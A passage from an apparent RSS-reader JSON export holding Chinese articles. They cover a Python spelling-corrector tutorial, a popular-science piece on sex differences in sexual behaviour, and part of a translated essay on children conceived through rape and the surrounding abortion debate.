range(len(word) + 1)]</p>\n\n<p>　　　　deletes    = [a + b[1:] for a, b in splits if b]</p>\n\n<p>　　　　transposes = [a + b[1] + b[0] + b[2:] for a, b in splits if len(b)&gt;1]</p>\n\n<p>　　　　replaces   = [a + c + b[1:] for a, b in splits for c in alphabet if b]</p>\n\n<p>　　　　inserts    = [a + c + b     for a, b in splits for c in alphabet]</p>\n\n<p>　　　　return set(deletes + transposes + replaces + inserts)</p>\n\n</blockquote>\n\n<p>edit1()函数中的几个变量的含义如下：</p>\n\n<blockquote>\n\n<p>　　（1）<strong>splits</strong>：将word依次按照每一位分割成前后两半。比如，'abc'会被分割成 [('', 'abc'), ('a', 'bc'), ('ab', 'c'), ('abc', '')] 。</p>\n\n<p>　　（2）<strong>beletes</strong>：依次删除word的每一位后、所形成的所有新词。比如，'abc'对应的deletes就是 ['bc', 'ac', 'ab'] 。</p>\n\n<p>　　（3）<strong>transposes</strong>：依次交换word的邻近两位，所形成的所有新词。比如，'abc'对应的transposes就是  ['bac', 'acb'] 。</p>\n\n<p>　　（4）<strong>replaces</strong>：将word的每一位依次替换成其他25个字母，所形成的所有新词。比如，'abc'对应的replaces就是 ['abc', 'bbc', 'cbc', ... , 'abx', ' aby', 'abz' ] ，一共包含78个词（26 ×  3）。</p>\n\n<p>　　（5）<strong>inserts</strong>：在word的邻近两位之间依次插入一个字母，所形成的所有新词。比如，'abc' 对应的inserts就是['aabc', 'babc', 'cabc', ..., 'abcx', 'abcy', 'abcz']，一共包含104个词（26 × 4）。</p></blockquote>\n\n<p>最后，edit1()返回deletes、transposes、replaces、inserts的合集，这就是与word\"编辑距离\"等于1的所有词。对于一个n位的词，会返回54n+25个词。</p>\n\n<p><strong>第七步，定义edit2()函数，用来生成所有与word的\"编辑距离\"为2的词语。</strong></p>\n\n<blockquote>\n\n<p>　　def edits2(word):</p>\n\n<p>　　　　return set(e2 for e1 in edits1(word) for e2 in edits1(e1))</p>\n\n</blockquote>\n\n<p>但是这样的话，会返回一个 (54n+25) * (54n+25) 的数组，实在是太大了。因此，我们将edit2()改为known_edits2()函数，将返回的词限定为在文本库中出现过的词。</p>\n\n<blockquote>\n\n<p>　　def known_edits2(word):</p>\n\n<p>　　　　return set(e2 for e1 in edits1(word) for e2 in edits1(e1) if e2 in NWORDS)</p>\n\n</blockquote>\n\n<p><strong>第八步，定义correct()函数，用来从所有备选的词中，选出用户最可能想要拼写的词。</strong></p>\n\n<blockquote>\n\n<p>　　def known(words): return set(w for w in words if w in NWORDS)</p>\n\n<p>　　def correct(word):</p>\n\n<p>　　　　candidates = known([word]) or known(edits1(word)) or known_edits2(word) or [word]</p>\n\n<p>　　　　return max(candidates, key=NWORDS.get)</p>\n\n</blockquote>\n\n<p>我们采用的规则为：</p>\n\n<blockquote>\n\n<p>　　（1）如果word是文本库现有的词，说明该词拼写正确，直接返回这个词；</p>\n\n<p>　　（2）如果word不是现有的词，则返回\"编辑距离\"为1的词之中，在文本库出现频率最高的那个词；</p>\n\n<p>　　（3）如果\"编辑距离\"为1的词，都不是文本库现有的词，则返回\"编辑距离\"为2的词中，出现频率最高的那个词；</p>\n\n<p>　　（4）如果上述三条规则，都无法得到结果，则直接返回word。</p>\n\n</blockquote>\n\n<p><strong>至此，<a href=\"http://pastebin.com/UVwuBrcs\">代码</a>全部完成，合起来一共21行。</strong></p>\n\n<blockquote>\n\n<p>　　import re, collections</p>\n\n<p>　　def words(text): return re.findall('[a-z]+', text.lower())</p>\n\n<p>　　def train(features):</p>\n\n<p>　　　　model = collections.defaultdict(lambda: 1)</p>\n\n<p>　　　　for f in features:</p>\n\n<p>　　　　　　model[f] += 1</p>\n\n<p>　　　　return model</p>\n\n<p>　　NWORDS = train(words(file('big.txt').read()))</p>\n\n<p>　　alphabet = 'abcdefghijklmnopqrstuvwxyz'</p>\n\n<p>　　def edits1(word):</p>\n\n<p>　　　　splits     = [(word[:i], word[i:]) for i in range(len(word) + 1)]</p>\n\n<p>　　　　deletes    = [a + b[1:] for a, b in splits if b]</p>\n\n<p>　　　　transposes = [a + b[1] + b[0] + b[2:] for a, b in splits if len(b)&gt;1]</p>\n\n<p>　　　　replaces   = [a + c + b[1:] for a, b in splits for c in alphabet if b]</p>\n\n<p>　　　　inserts    = [a + c + b     for a, b in splits for c in alphabet]</p>\n\n<p>　　　　return set(deletes + transposes + replaces + inserts)</p>\n\n<p>　　def known_edits2(word):</p>\n\n<p>　　　　return set(e2 for e1 in edits1(word) for e2 in edits1(e1) if e2 in NWORDS)</p>\n\n<p>　　def known(words): return set(w for w in words if w in NWORDS)</p>\n\n<p>　　def correct(word):</p>\n\n<p>　　　　candidates = known([word]) or known(edits1(word)) or known_edits2(word) or [word]</p>\n\n<p>　　　　return max(candidates, key=NWORDS.get)</p>\n\n</blockquote>\n\n<p>使用方法如下：</p>\n\n<blockquote>\n\n<p>　　&gt;&gt;&gt; correct(&#39;speling&#39;)</p>\n\n<p>　　'spelling'</p>\n\n<p>　　&gt;&gt;&gt; correct(&#39;korrecter&#39;)</p>\n\n<p>　　'corrector'</p>\n\n</blockquote>\n\n<p><strong>四、缺陷</strong></p>\n\n<p>我们使用的这种算法，有一些缺陷，如果投入生产环境，必须在这些方面加入改进。</p>\n\n<p><strong>（1）文本库必须有很高的精确性，不能包含拼写错误的词。</strong></p>\n\n<p>如果用户输入一个错误的拼法，文本库恰好包含了这种拼法，它就会被当成正确的拼法。</p>\n\n<p><strong>（2）对于不包含在文本库中的新词，没有提出解决办法。</strong></p>\n\n<p>如果用户输入一个新词，这个词不在文本库之中，就会被当作错误的拼写进行纠正。</p>\n\n<p><strong>（3）程序返回的是\"编辑距离\"为1的词，但某些情况下，正确的词的\"编辑距离\"为2。</strong></p>\n\n<p>比如，用户输入reciet，会被纠正为recite（编辑距离为1）,但用户真正想要输入的词是receipt（编辑距离为2）。也就是说，\"编辑距离\"越短越正确的规则，并非所有情况下都成立。</p>\n\n<p><strong>（4）有些常见拼写错误的\"编辑距离\"大于2。</strong></p>\n\n<p>这样的错误，程序无法发现。下面就是一些例子，每一行前面那个词是正确的拼法，后面那个则是常见的错误拼法。</p>\n\n<blockquote>\n\n<p>  purple perpul<br>\n  curtains courtens<br>\n  minutes muinets<br>\n  successful sucssuful<br>\n  inefficient ineffiect<br>\n  availability avaiblity<br>\n  dissension desention<br>\n  unnecessarily unessasarily<br>\n  necessary nessasary<br>\n  unnecessary unessessay<br>\n  night nite<br>\n  assessing accesing<br>\n  necessitates nessisitates</p>\n\n</blockquote>\n\n<p><strong>（5）用户输入的词的拼写正确，但是其实想输入的是另一个词。</strong></p>\n\n<p>比如，用户输入是where，这个词拼写正确，程序不会纠正。但是，用户真正想输入的其实是were，不小心多打了一个h。</p>\n\n<p><strong>（6）程序返回的是出现频率最高的词，但用户真正想输入的是另一个词。</strong></p>\n\n<p>比如，用户输入ther，程序会返回the，因为它的出现频率最高。但是，用户真正想输入的其实是their，少打了一个i。也就是说，出现频率最高的词，不一定就是用户想输入的词。</p>\n\n<p><strong>（7）某些词有不同的拼法，程序无法辨别。</strong></p>\n\n<p>比如，英国英语和美国英语的拼法不一致。英国用户输入'humur'，应该被纠正为'humour'；美国用户输入'humur'，应该被纠正为'humor'。但是，我们的程序会统一纠正为'humor'。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/10/spelling_corrector.html\">http://www.ruanyifeng.com/blog/2012/10/spelling_corrector.html</a></li>\n<li>最后修改时间：2012年11月27日 17:42</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://www.hi-vps.com\" style=\"border:none\">www.hi-vps.com创建于2010年，致力于提供更适合国人使用，性价比更高的VPS。我们的支付方式为支付宝，并且提供7天无理由退款服务。其他使用指南，请参考我们的WIKI。</a>\n</p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1349806511631",
    "timestampUsec" : "1349806511631389",
    "id" : "tag:google.com,2005:reader/item/ea7f3e08ba3c0e70",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "在床上，咱们都是地球人！",
    "published" : 1349806511,
    "updated" : 1349806511,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/344443/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>男女有别这话确实不错，男人和女人对于“性”当然也有各自不同的感觉。有种观点曾广为流传：女人来自金星，男人来自火星；女人利用“性”来获取一段关系，男人利用一段关系来得到“性”；女人需要的是性伴侣的“伴侣”，男人需要的是性伴侣的“性”。很多人都听说过上面这个古老的传言——但这些看法有多深刻？靠谱吗？</p>\n<p>关于男女之间的性别差异，有过很多讨论，其中的大多数都认为这些差异是巨大而不可逾越的鸿沟，男性和女性甚至几乎无法相互理解。最近，研究者就性行为中的性别差异开展了一项研究，该研究展示了和上述观点不同的答案。</p>\n<p>威斯康星大学麦迪逊分校（the University of Wisconsin at Madison）的研究人员统计了1943年至2007年期间发表的500多份研究结论之后，又将所得到的结论与几项正在进行中的大型调查相对比——这些调查总共涉及上万名美国人、英国人和澳大利亚人。从这些研究的时间跨度和巨大的规模来看，结论还是比较靠谱的。</p>\n<p>那么在“性”方面，男人和女人的差异究竟有多大呢？从研究结果看，性别差异虽然存在，但绝对不像“金星”和“火星”离得那么远。</p>\n<div>\n<h1>与异性的性交</h1>\n<p>有一种看法是，男性总是迫不及待地和任何女性上床，哪怕她并不是很情愿；而女性则精挑细选。如果真是这样，那么男性所报告的性交应该远远多于女性（部分原因是男性会成为性工作者的客户）\n。\n报告中，十几至二十几岁的被试在与异性性交方面，确实存在着较大的性别差异。但从长远来看，差异就没那么明显了。在所有年龄段的成年人中，男性和女性所报告的与异性性交的比例大致相同，只是男性报告的性交频率和性伴侣数略高于女性。在这方面，实际的性别差异比不少人所认为的要小很多。</p>\n</div>\n<div>\n<h1>初次性交的年龄</h1>\n<p>有一种普遍的观点是，由于睾酮的作用，男青年初次性交的年龄要大大早于羞涩的女青年。实际上，性别差异远没有人们想象的那么大。在1970年之前，男性初次性交的平均年龄是18岁，女性是19岁。自上世纪90年代中期以来，男性和女性初次性交的平均年龄分别为15岁和16岁。</p>\n</div>\n<div>\n<h1>口交</h1>\n<p>第二次世界大战之后到上世纪60年代，口交（包括男性对女性的，以及女性对男性的）代表着性行为的前沿。如今，口交虽然不算极其普遍，但也有不少人尝试过了——几乎没有性别差异。</p>\n<p>很多关于口交的研究并不区分“提供”口交和“接受”口交，不过美国国家健康和社会生活调查（National Health and Social Life Survey）的调查填补了这项空白。调查显示，77%的男性声称自己对女伴进行口交，73%的女性报告男伴对自己进行口交；68%的女性表示自己对男伴进行口交，而79%的男性报告女伴对自己进行口交。从数据上看，性别差异也不算大。</p>\n</div>\n<div>\n<h1>男人没一个好东西？</h1>\n<p>很多人觉得不安分的男性总会出轨，而相对安分的女性则不会。研究婚外性行为的难度很大，因为即便调查是匿名的，很多人也不愿承认。然而，这方面的研究相当一致地显示，约有25%的男性和15%的女性有婚外性行为——虽然差异较大，但这一数据可能比很多人想象的要小很多。</p>\n</div>\n<div>\n<h1>自慰</h1>\n<p>和婚外性行为一样，对自慰的研究也比较困难，因为很多人不愿承认，或者隐瞒了自慰的真实频率。相比于较早的研究，近期研究显示的进行自慰的性别差异更小。然而，自慰仍是性别差异较大的少数几个方面之一。相对最靠谱的估算是，在过去的一年里，约有63%的男性和42%的女性进行了自慰。</p>\n<p>造成这一差异的原因之一可能是色情作品。色情作品在网上随处可见。根据色情行业的业内人士透露，80%的观众都是男性——一个人在看，一只手在忙。</p>\n</div>\n<div>\n<h1>内疚感</h1>\n<p>历史上，女性的性行为受到更多的社会限制——因为女性如果被认为“不守妇道”，往往会受到更严厉的责罚。由此，人们会认为女性比男性更容易对“性”产生负疚感。1960年之前的研究显示，的确如此。但在此之后，媒体对女性性行为不那么苛责了，女性也更少地受制于家庭，并能更充分地参与社会生活。因此，女性的负疚感骤降。而现在，男性和女性之间的差异更小了。</p>\n</div>\n<div>\n<h1>性满意度</h1>\n<p>在性满意度方面，这些研究只发现了细微的性别差异，有的研究甚至没有发现出差异。</p>\n<p>需要强调的是，这些发现并不是从某一项研究中得出的，而是从过去68年里已发表的500多项共涉及数千名被试的研究中提炼而出的。这些结论也许并不完美，但庞大的样本数量还是有一定说服力的。</p>\n<p>看来，总的来说，女人并非来自金星，男人也并非来自火星。男性和女性在“性”方面能找到越来越多的共同点。在床上，男人和女人都是来自地球的。</p>\n<p>本文编译自 Women from Venus? Men from Mars? The Real Sexual Gender Divide</p>\n<blockquote>\nPS：其实，无论金星地球还是火星，不都是围着太阳转的么~~~</blockquote>\n</div>\n</div>"
    },
    "author" : "Frances",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1349806464278",
    "timestampUsec" : "1349806464278545",
    "id" : "tag:google.com,2005:reader/item/f55df802555530b6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "因强奸而生：那些被遗忘的受害人",
    "published" : 1349806464,
    "updated" : 1349806464,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/348606/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<div><img src=\"http://img1.guokr.com/gkimage/kb/gu/p7/kbgup7.png\" alt=\"（图片：Gegen Missbrauch）\"><p>（图片：Gegen Missbrauch）</p></div>\n<p>（文／Andrew Solomon）美国每年因强奸导致的怀孕大约有 2.5 万起。虽然这在每年 300 万例的意外怀孕事件中只算很小的一部分，但这个数字还是非常之高的。不过了，强奸和怀孕之间的关系早已经是高度政治化的辩论议题，近来更是有托德•阿金（Todd Akin）抛出他 “正当强奸” 的言论 <a href=\"http://www.guokr.com/#id8\">[1]</a> ，保罗•瑞安（Paul Ryan）提出他含有 “暴力强奸罪” 的法案 <a href=\"http://www.guokr.com/#id9\">[2]</a> ，还有沙伦•安格尔（Sharron Angle）两年前的建议——他建议那些因强奸而怀孕的妇女 “把酸柠檬处境变成柠檬水”。</p>\n<p>在统计数据上，强奸和怀孕也是名符其实的在打仗；支持妇女选择和反堕胎运动的议程此消彼长，更是加剧了局面的混乱。有人说恐惧会促进排卵，被强奸的妇女有 10% 的几率会怀孕；也有人估计这个可能性只低至 1%。数字随着统计条件的变动出现各种扭曲：包不包括非育龄期妇女；包不包括鸡奸和其他不会导致怀孕的强奸；包不包括可能服用口服避孕药或者佩戴了宫内节育器的强奸受害者；还有包不包括在遭到强奸之前或者以后，因为跟丈夫或伴侣（不是强奸犯）发生双方同意的性行为而怀上孕的妇女。长期遭到虐待的女性尤其容易在被强奸时受孕。凯瑟琳·麦金农（Catherine MacKinnon）曾写道 <a href=\"http://www.guokr.com/#id10\">[3]</a> ： “强迫怀孕之习由来已久，它自强奸始，持续贯穿于整个不许堕胎的过程；这种行为发生在奴隶制社会，而今仍然还在折磨着那些不能堕胎的妇女。”</p>\n<p>我一直在研究的一本书《离树不远》（Far from the Tree），有部分内容就涉及了女性抚养自己在被强奸时怀上的孩子，这些女性可谓托德·阿金所言所指活生生的反例。生活对于这些孩子来说可能会极度艰难。人生污点有限公司（Stigma Inc.）是为数不多的几家致力于帮助这部分特定人群而成立的组织之一，其信条是：“强奸幸存者是受害者……她们的孩子是被遗忘的受害者。”</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<h1>强奸之事，古已有之</h1>\n<p>然而，在这些被遗忘的受害者、还有他们的母亲，在这些人的遭遇背后，有着许多的历史。希波的 <a href=\"http://zh.wikipedia.org/wiki/%E5%A5%A5%E5%8F%A4%E6%96%AF%E4%B8%81_(%E5%B8%8C%E6%B3%A2%E4%B8%BB%E6%95%99)\">奥古斯丁（Augustine）</a> 认为，强奸有着一个崇高的目的；他一面向妇女们允诺 “侵犯她们的兽欲将受到惩罚”，同时又称赞强奸使女人保持谦卑，让她们明白 “自己以前是否对自己的童贞感到骄傲或太过热衷于赞美；又或者要是没有遭到侵犯，她们是否会变得骄傲”。罗马医生盖伦（Galen）声称，女人在被强奸时不可能怀孕——实际上，是女人不可能在没有基于快感和同意的性高潮之下怀孕。</p>\n<p>古典神话故事中更是强奸泛滥，强奸还常常被视作一桩好事——当然，是对于强奸犯而言，而强奸犯往往都是神祗：宙斯强奸了欧罗巴（Europa）和勒达（Leda），酒神狄俄倪索斯强奸了奥拉（Aura），海神波塞冬强奸了埃特拉（Aethra），太阳神阿波罗强奸了欧阿德涅（Euadne）。值得注意的是，这些强奸每一例都产生了孩子。战神玛尔斯（Mars）强暴了一名贞洁的女祭司，生下了罗穆卢斯（Romulus）和瑞摩斯（Remus），这二人建立了后来古罗马帝国。罗穆卢斯组织强奸了萨宾人的妇女，为自己的新城市增添人口。在很久之后的文明中，强掳萨宾妇女被当成一个高尚的故事；在文艺复兴时期，新人的嫁妆箱上常常绘有古罗马人强掳萨宾妇女的场面。</p>\n<p>同样，世人因其出身而对这些孩子萌生的恶意也早已有之。在古代和中世纪的国家里，妇女将自己产下的强奸之子抛置野外是被允许的，虽然在中世纪的欧洲，这样做需要接受几个星期的苦修才行。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/yk/g9/9b/ykg99b.png\" alt=\"强掳萨宾妇女，意大利画家雅克布·利格齐（Jacopo Ligozzi）作品。（图片：en. wikipedia.com）\"><p>强掳萨宾妇女，意大利画家雅克布·利格齐（Jacopo Ligozzi）作品。（图片：en. wikipedia.com）</p></div>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>定义的嬗变：强奸究竟是什么？</h1>\n<p>历史上，一直以来，强奸与其说被视为对一个女人的侵犯，它更多的还是被当成从这个女人所属的男人那里得手的一次盗窃，她的丈夫也好、父亲也罢，强奸使这个男人蒙受了经济损失（女方的婚姻价值受损），他的荣誉遭到了侮辱。</p>\n<p>还有私生子的问题，这些孩子被视为社会的负担，以雅典政权为例，雅典的法律以保护血统为主要考虑，因此强奸与通奸做同等处理。《汉谟拉比法典》将强奸受害者描述为通奸者，17 世纪的英国法律也采取了类似的立场。在清教徒聚集的美国马萨诸塞州，任何因被强奸而怀孕的妇女一律被指控犯有私通罪而受到起诉。19 世纪时，美国法院仍然偏袒男性可能会被错误地指控。为了证明她所遭遇到的是强奸，女方必须拿出证据表明她进行过抵抗而后又被压制，通常女性必须要展示她身体上的伤害以作为她曾经奋力抵抗过的证据，而且她还得以某种方式证明男子确实在她的体内射精。</p>\n<p>在 20 世纪初一直到中叶，强奸案的报案率一直偏低，因为女性担心说出发生在她们身上的事情会造成不好的影响。1938 年，一位名叫阿力克·博尔内（Aleck Bourne）的医生因对一名 14 岁的强奸受害者实施了人工流产手术而接受了审判，他的无罪释放则反映了出当时解放堕胎、尤其是解放强奸受害者堕胎的民粹主义运动。审判在当时的美国得到了广泛的报道，并且引发了关于堕胎合法性的公开辩论；次年，美国第一个医院里的人工流产委员会成立，到 1950 年代，这样的委员会已经非常普及。</p>\n<p>虽然委员会只批准 “治疗性” 的堕胎，但他们越来越多地采纳精神科医生的建议，即一个女人的心理健康会因怀孕而受到威胁。既有人脉、又有财力的妇女可以很容易地拿到精神疾病的诊断，因此堕胎也就成了特权阶级的专利。普通的强奸受害者往往必须证明她们正处在精神错乱的边缘。有的被诊断为荒淫，只有同意被绝育（※此处已修改）才能得到堕胎的批准。下面是一份典型的强奸个案工作报告，写于二战后 <a href=\"http://zh.wikipedia.org/zh-cn/%E7%BE%85%E8%A8%B4%E9%9F%8B%E5%BE%B7%E6%A1%88\">罗诉韦德案</a> 裁决之前的时代：</p>\n<p><em>她成了一个被动的对象，不会说 “不”。在这里，我们看到了一个失去了父母爱的女孩，她继续追寻爱情并把主要动机围绕在了满足她的对象的需求之上。 她把这个男人的性欲当成了爱和一个被人爱的机会。</em></p>\n<p>也就是说，精神稳定的人是不会被强奸的。新兴的精神分析学研究也没有起到实质性的帮助。虽然弗洛伊德本人极少写过关于强奸的著述，但 20 世纪早中期的弗洛伊德学派研究者们却认为，强奸犯患有一种反常的、不受控制的性欲，正好满足了女性生来便有的性受虐倾向。这个立场看来有为强奸犯开脱之嫌；1971 年，精神分析学家贝京•阿米尔（Menachem Amir）称，强奸是 “由受害人引发的犯罪”。强奸犯是男子气概的体现，而被强奸者则一文不值；与其说是在谴责侵犯行为，不如说是在惋惜罪犯遭到惩罚。</p>\n<blockquote>\n男人自发现性交导致怀孕后便开始了对女人的强奸。——苏珊·布朗米勒</blockquote>\n<p>震惊于此等立场，1970 年代的女权主义者们开始对强奸重新分类，将其视为一种暴力和侵略行为，而不止是关乎性欲。苏珊·布朗米勒（Susan Brownmiller）在其 1975 年划时代之作《违我之志：男人、女人和强奸》（Against Our Will: Men, Women, and Rape）一书中指出，强奸极少关乎欲望，但与统治有着方方面面的关联。她提出，强奸比人们此前意识到的发生得更加频繁，它不是很偶然的一个有严重精神疾病的人做的不起眼的事，而是男女双方实力悬殊导致的共同结果。布朗米勒还将强奸与怀孕系在一起，她写道 “男人自发现性交导致怀孕后便开始了对女人的强奸”。</p>\n<p>我采访的几位女士表示，对强奸意味着什么感到疑惑，想到有强奸可以是非强迫性的、甚至是正当的，使得情况更加恶劣。犯下了强奸的罪行却逃脱受罚的男人，极少会因羞耻或忏悔而有所收敛；他们还常常对其播下的种子宣称主权来炫耀其残忍的精力。在我采访过的女性中，她们对这种人提出监护权或探视权申请，感到的远非关心，而更像是进一步的侵犯。然而，在强奸无法被证实或者诉讼从未被发起的情况下，共同监护所带来的威胁是真实存在的。而许多无法提起诉讼的女性又没有任何证据表明侵犯发生过、无法对共同监护提出抗议。在一个 DNA 证据可以从科学上确立生物学关系的时代，缺乏有效证明受孕时当事人所处社会环境的有关证据变得更加严重了。人生污点有限公司的一张宣传海报上写着， “父亲／强奸犯因故被视为不适合保有未成年子女的探视权或监护权。但是，以一般的强奸受害者而言，证明强奸发生的责任往往是由受到侵犯的女性这一方负担。通常最后会变成 ‘他说／她说’ 的问题。”</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>生还是不生，这应该是一个选择</h1>\n<p>强奸的事后影响从来都是复杂的。许多受害者干脆就拒绝接受她们已经怀孕的事实：足足有 1/3 的强奸致孕案例都是到了妊娠中期（第 5~7 个月）才被发现。任何检测上的延迟都会减少女性选择的机会，特别是对于大的城市中心地区之外的女性来说，可许多女性都迟迟难以下定决心；她们还没有从被人强奸的打击中恢复过来，这种时候又让她们就要不要堕胎拿定主意。无论是决定要把这一段怀孕的历程坚持走完抑或是不走，在她们前面的都会是一条荆棘之路，不管最终的选择如何，都会导致抑郁、焦虑、失眠，还有创伤后应激障碍。强奸是一种永久性的伤害；它留下的不是疤，而是永远都在淌血的伤口。我见过一个女人说， “你可以拿掉孩子，但你拿不走那段经历”。</p>\n<p>就算是努力让自己明白孩子是无辜的，这些女性也会很难做到这一点。英国精神分析学家琼·拉斐尔-莱夫（Joan Raphael-Leff）对强奸时受孕的妇女有如下描述， “这个女人觉得在她里面有一部分令人憎恨或厌恶的异类在生长。除非这种感情可以得法宣泄，胎儿只得继续保有这些特征，作为体内的一个外来人，勉强被容忍，时刻处于被驱逐的危险之下，孩子生下来也跟半个陌生人一样，可能被赶出家门或受到惩罚。” 一位强奸幸存者在路易斯安那州参议院健康与福利委员前会作证时，把她的儿子形容是 “活生生的，有呼吸的刑具，在我的脑海里一遍又一遍地重现那场强奸”。 另一位女性说生下一个强奸受孕的儿子就像 “无法形容的陷阱”，她觉得 “这个孩子从出生起就受到了诅咒”；孩子最终患上了严重的心理障碍并被社会工作者出于他的心理健康考虑而从家里带走。我采访的女性说， “虽然大多数的母亲都顺着她们的本能做事，但我的本能是可怕的。我的本能之所以还被压抑着，是我持续的、有意识的努力的结果。”</p>\n<blockquote>\n迫人流产和不许堕胎一样险恶。</blockquote>\n<p>堕胎法案中对强奸致孕开设的例外常常被援引，简直成了规定一样，以至于许多希望把孩子给生下来的女性感受到了巨大的社会压力去打掉孩子，而迫人流产和不许堕胎是一样险恶的。毫无疑问，对于某些女性来说，堕胎造成的创伤会更比生下一个强奸致孕的孩子更难以承受。我读过一个女孩写的令人难过的自传，讲述了她被强行放入昏迷之后接受了人流手术，孩子是她在被她父亲强奸时怀上的，她父母这样做是为了保持自己的声誉完好无损。这个故事之所以骇人，是因为这里涉及的堕胎显然构成了另一种侵犯：不给人选择。</p>\n<p>随时都能接受安全的人流手术，会使一个决定把强奸之子生下来的女性知道，她所做的，是一个有意识的选择；而不是因为她别无选择，只能延续自己的创伤并惩罚这个孩子。最重要的，是强奸并非受害者的意愿，而最应该让强奸受害者感受到的，是她们握有掌控权。被强奸过的女性应该享有以下不受约束的选择权：是要堕胎还是要把孩子给生下来；如果是要把孩子生下来，是自己抚养还是交由他人领养。和残疾儿童的父母一样，这些女性选择的是孩子，而不是孩子带有的特殊身份。这里的关键词是 “选择”。</p>\n<p>在美国以外的地方也能见到这个问题。《赫尔姆斯修正案》（Helms Amendment）意味着，凡是接受美国援助的机构一律不得对女性实施人流手术，哪怕女性遭到的是以种族灭绝运动为目的而进行的有计划的强奸。记者海伦娜•史密斯（Helena Smith）曾写过这样一个故事，一个名叫米尔维塔（Mirveta）的女孩儿生下了一个她在科索沃被强奸时怀上的孩子。米尔维塔当时 20 岁，不识字，她的丈夫因为她怀孕而抛弃了她。史密斯写道： “他是个健康的小男孩，米尔维塔生下了他。但在她短短一生中，这第 5 次生产带来的不是快乐，只有恐惧。在科索沃当地受英国政府管理的大学附属医院里，护士把她的宝宝递给她，这位年轻的阿尔巴尼亚母亲接过孩子，做好了准备。她轻轻地把他揽到自己胸前，注视着她儿子的双眼，抚摸了他的小脸，然后拧断了他的脖子。人人都说她的动作干净利落。米尔维塔亲手了结了他。据说，她流着泪把孩子递回给护士，托着他已经折断了的脖子。之后米尔维塔被关进了精神羁留所，她的泪从进屋起就没有停过。照顾她的援助工作者说： “谁知道呢？也许她看着婴儿的脸，看到了那个强奸了她的塞族人的眼睛。她也是个受害者。在精神上又一次被强奸了。’”</p>\n<div>\n<div><br></div>\n</div>\n<p>为写书收集资料，我在 2004 年去卢旺达采访了之前在大屠杀中因强奸而受孕的妇女。在结束我的采访时，我问受访者她们有没有什么问题要问我的，我希望这种换位有助于减轻她们在采访这个小情景里所体验到的被动感觉。我得到的问题往往是相同的：你要在卢旺达待多久？你采访了多少个人？你的研究什么时候发表？什么样的人会看这些故事？你为什么会对我感兴趣？在我最后的一次采访要结束时，我问接受采访的女士是否有任何问题。她很不好意思地停了一会儿。“嗯，” 她说，有点欲言又止： “你是学心理学的。” 我点点头。她深吸了一口气，问： “你能告诉我该怎么更爱我的女儿吗？我很想要爱她，我尽我的最大努力，但当我看她时，我看到曾经发生在我身上的事，就被干扰了。” 一滴眼泪顺着她的脸颊流下，但她的语气却变得尖锐，像是在质问，她重复说： “你能告诉我怎么做才能多爱我女儿一点吗？”</p>\n<p>也许托德·阿金能给她一个答案。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>内容注释:</th><td></td>\n</tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id1\">[1]</a></td><td>美国众议员托德·阿金日前发表言论称， “面对正当强奸（legitimate rape），女性的身体具备中止整个过程的机能” ，引起轩然大波。阿金表示， “强奸导致怀孕的情况十分罕见，因为遭受强奸的妇女身体会通过一种特殊的方式来防止怀孕。” 这个没有根据的说法遭到强烈抨击，最后他不得不承认 “不存在正当的强奸（legitimate rape）”。</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id2\">[2]</a></td><td>保罗·瑞安是 2012 年美国共和党总统竞选人米特·罗姆尼的竞选搭档，也即副总统竞选人。连任 7 届威斯康星州众议员的保罗·瑞安在小布什任上曾推出多项反堕胎法案，其中就包括试图取消禁止用联邦资金堕胎的法案中为强奸及乱伦致孕制定的例外规定，并且把强奸的定义缩小为 “暴力强奸”（forcible 